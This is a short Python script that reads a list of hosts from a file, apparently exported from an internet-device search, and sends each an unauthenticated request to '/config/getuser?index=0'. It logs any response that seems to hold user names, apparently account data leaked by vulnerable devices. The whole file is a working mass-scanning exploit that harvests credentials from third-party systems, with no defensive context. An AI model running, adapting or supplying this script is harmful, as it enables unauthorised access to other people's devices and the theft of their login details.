import json
import requests

with open("jp.txt","r") as f:
    info = f.read()
info = json.loads(info)
print(info["results"][0][0])
for each in info["results"]:
    try:
        ip = each[0]
        ip = str(ip).replace("https://","")
        every_ip = "http://" + ip + "/config/getuser?index=0"
        print(every_ip)
        rq = requests.get(url=every_ip,verify=False,timeout=3)
        print(rq.status_code)
        print(rq.text)
        if "name" in rq.text:
            with open("log.txt","a+") as f:
                f.write(str(ip))
                f.write('\n')
                f.write(rq.text)
                f.write('\n')
    finally:
        continue
